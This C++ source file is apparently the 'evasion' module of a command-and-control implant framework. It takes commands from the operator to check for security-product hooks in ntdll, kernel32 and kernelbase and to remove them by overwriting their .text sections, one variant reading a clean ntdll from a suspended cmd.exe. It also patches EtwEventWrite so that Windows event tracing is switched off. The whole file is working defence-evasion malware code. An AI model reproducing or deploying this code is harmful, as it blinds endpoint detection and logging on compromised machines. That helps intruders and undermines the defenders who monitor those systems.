/* 
 credits: reenz0h (twitter: @SEKTOR7net)
 credits: NtRaiseHardError
 credits: Joe Desimone, Cornelis de Plaa
*/
#include "Evasion.hpp"

#include <cstring>

#ifdef _WIN32
#include "structs.hpp"
#endif

#include "Common.hpp"


using namespace std;

constexpr std::string_view moduleName = "evasion";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Evasion* A_EvasionConstructor() 
{
    return new Evasion();
}

std::string hookChecker(const HMODULE hHookedDll, const LPVOID pMapping);

static int UnhookDll(const HMODULE hHookedDll, const LPVOID pMapping);

int disableETW(void);

#else

__attribute__((visibility("default"))) Evasion* EvasionConstructor() 
{
    return new Evasion();
}

#endif


Evasion::Evasion()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

Evasion::~Evasion()
{
}

std::string Evasion::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "evasion:\n";
	info += "exemple:\n";
	info += "- evasion CheckHooks (ntdll, kernelbase, kernel32)\n";
	info += "- evasion DisableETW\n";
	info += "- evasion Unhook (ntdll, kernelbase, kernel32)\n";
	info += "- evasion UnhookPerunsFart (ntdll)\n";
#endif
	return info;
}

int Evasion::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	if (splitedCmd.size() >= 2)
	{
		std::string cmd = splitedCmd[1];
		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_cmd(cmd);
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int Evasion::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string result;
	const std::string cmd = c2Message.cmd();

#ifdef _WIN32

	if(cmd=="CheckHooks")
	{
		checkHooks(result);
	}
	else if(cmd=="DisableETW")
	{
		disableETW();
		result+="DisableETW sucess.";
	}
	else if(cmd=="Unhook")
	{		
		unhookFreshCopy(result);
	}
	else if(cmd=="UnhookPerunsFart")
	{		
		unhookPerunsFart(result);
	}
		
#endif

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd("");
	c2RetMessage.set_returnvalue(result);

	return 0;
}

#ifdef _WIN32


int Evasion::checkHooks(std::string& result)
{
	std::string dllBasePath="c:\\windows\\system32\\";
	std::vector<std::string> dllNames;
	dllNames.push_back("kernel32.dll");
	dllNames.push_back("ntdll.dll");
	dllNames.push_back("kernelbase.dll");

	for(int i=0; i<dllNames.size(); i++)
	{
		std::string dllPath=dllBasePath;
		dllPath+=dllNames[i];

		HANDLE hFile = CreateFile((LPCSTR) dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			return -1;
		}

		HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		if (! hFileMapping) 
		{
			CloseHandle(hFile);
			return -1;
		}
		
		LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
		if (!pMapping) 
		{
			CloseHandle(hFileMapping);
			CloseHandle(hFile);
			return -1;
		}
			
		result+="\n-> ";
		result+=dllNames[i];
		result+=":\n";
		result+=hookChecker(GetModuleHandle((LPCSTR) dllNames[i].c_str()), pMapping);

		UnmapViewOfFile(pMapping);
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
	}
	
	return 0;
}


int Evasion::unhookFreshCopy(std::string& result)
{
	std::string dllBasePath="c:\\windows\\system32\\";
	std::vector<std::string> dllNames;
	dllNames.push_back("kernel32.dll");
	dllNames.push_back("ntdll.dll");
	dllNames.push_back("kernelbase.dll");

	for(int i=0; i<dllNames.size(); i++)
	{
		std::string dllPath=dllBasePath;
		dllPath+=dllNames[i];

		HANDLE hFile = CreateFile((LPCSTR) dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if ( hFile == INVALID_HANDLE_VALUE ) 
		{
			return -1;
		}

		HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		if (! hFileMapping) 
		{
			CloseHandle(hFile);
			return -1;
		}
		
		LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
		if (!pMapping) 
		{
			CloseHandle(hFileMapping);
			CloseHandle(hFile);
			return -1;
		}

		// remove hooks
		result+="\n-> ";
		result+=dllNames[i];
		result+=":\n";
		int ret = UnhookDll(GetModuleHandle((LPCSTR) dllNames[i].c_str()), pMapping);
		if(ret!=0)
			result+="UnhookDll failed.";
		else
			result+="UnhookDll sucess.";

		UnmapViewOfFile(pMapping);
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
	}

	return 0;
}


int findFirstSyscall(char * pMem, DWORD size)
{
	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
	
	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) 
	{
		if (!memcmp(pMem + i, pattern1, 3)) 
		{
			offset = i;
			break;
		}
	}		
	
	// now find the beginning of the syscall
	for (i = 3; i < 50 ; i++) 
	{
		if (!memcmp(pMem + offset - i, pattern2, 3)) 
		{
			offset = offset - i + 3;
			// printf("First syscall found at 0x%p\n", pMem + offset);
			break;
		}		
	}

	return offset;
}


int findLastSysCall(char * pMem, DWORD size) 
{
	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
	
	// backwards lookup
	for (i = size - 9; i > 0; i--) 
	{
		if (!memcmp(pMem + i, pattern, 9)) 
		{
			offset = i + 6;
			// printf("Last syscall byte found at 0x%p\n", pMem + offset);
			break;
		}
	}		
	
	return offset;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) 
{
    // UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);

	// find .text section
	for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) 
	{
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *)pImgSectionHead->Name, ".text")) 
		{
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) 
			{
				// RWX failed!
				return -1;
			}

			// copy clean "syscall table" into ntdll memory
			DWORD SC_start = findFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = findLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			
			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) 
			{
				DWORD SC_size = SC_end - SC_start;
				printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
				printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
				printf("size: %i\n", SC_size);
				getchar();
				memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
						(LPVOID)((DWORD_PTR) pCache + + SC_start),
						SC_size);
			}

			// restore original protection settings of ntdll
			VirtualProtect((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) 
			{
				// it failed	
				return -1;
			}
			return 0;
		}
	}
	
	// failed? .text not found!
	return -1;
}


int Evasion::unhookPerunsFart(std::string& result)
{
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	BOOL success = CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, "C:\\Windows\\System32\\", &si, &pi);
	if (success == FALSE) 
	{
		result+="Failed to CreateProcess.";
		return -1;
	}	

	// get the size of ntdll module in memory
	char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	
	SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
	
	// allocate local buffer to hold temporary copy of clean ntdll from remote process
	LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
	
	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
	{
		result+="Failed to CreateProcess.";
		return -1;
	}	
		
	TerminateProcess(pi.hProcess, 0);
	
	// remove hooks
	unsigned char sNtdll[] = "ntdll.dll";
	int ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
	if(ret!=0)
		result+="UnhookNtdll failed.";
	else
		result+="UnhookNtdll sucess.";

	return 0;
}


int disableETW(void) 
{
	unsigned char sEtwEventWrite[] = "EtwEventWrite";
	void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
	
	DWORD oldprotect = 0;
	VirtualProtect(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

	VirtualProtect(pEventWrite, 4096, oldprotect, &oldprotect);
	FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
	return 0;
}


std::string hookChecker(const HMODULE hHookedDll, const LPVOID pMapping) 
{
	// Get information from about function from the mapping of the new dll
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);

	std::string hookedFunctions;
	if (pImgNTHead->Signature != IMAGE_NT_SIGNATURE) 
	{
		return hookedFunctions;
	}

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pMapping + pImgNTHead->OptionalHeader.DataDirectory[0].VirtualAddress);	

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pMapping + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pMapping + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pMapping + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) 
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pMapping + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pMapping + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		PVOID pFunctionAddressHookedDll = (PBYTE)hHookedDll + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
		
		if (*((PBYTE)pFunctionAddress) == *((PBYTE)pFunctionAddressHookedDll)
			&& *((PBYTE)pFunctionAddress + 1) == *((PBYTE)pFunctionAddressHookedDll + 1)
			&& *((PBYTE)pFunctionAddress + 2) == *((PBYTE)pFunctionAddressHookedDll + 2)
			&& *((PBYTE)pFunctionAddress + 3) == *((PBYTE)pFunctionAddressHookedDll + 3)
			&& *((PBYTE)pFunctionAddress + 6) == *((PBYTE)pFunctionAddressHookedDll + 6)
			&& *((PBYTE)pFunctionAddress + 7) == *((PBYTE)pFunctionAddressHookedDll + 7)) 
		{				
			// printf("[+] function %s clean\n", pczFunctionName);
		}
		else
		{
			std::string msg="[-] function ";
			msg+=pczFunctionName;
			msg+=" hooked\n";
			hookedFunctions+=msg;
		}
	}

	return hookedFunctions;
}


static int UnhookDll(const HMODULE hHookedDll, const LPVOID pMapping)
{
	// UnhookDll() finds .text segment of fresh loaded copy of dll and copies over the hooked one
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);

	// find .text section
	for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) 
	{
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text")) 
		{
			// prepare dll memory region for write permissions.
			VirtualProtect((LPVOID)((DWORD_PTR) hHookedDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) 
			{
				return -1;
			}

			// copy fresh .text section into dll memory
			memcpy( (LPVOID)((DWORD_PTR) hHookedDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					(LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					pImgSectionHead->Misc.VirtualSize);

			std::cout << "pImgSectionHead->Misc.VirtualSize " << pImgSectionHead->Misc.VirtualSize << std::endl;

			// restore original protection settings of dll memory
			VirtualProtect((LPVOID)((DWORD_PTR)hHookedDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			
			if (!oldprotect) 
			{
				return -1;
			}
			return 0;
		}
	}

	return -1;
}


#endif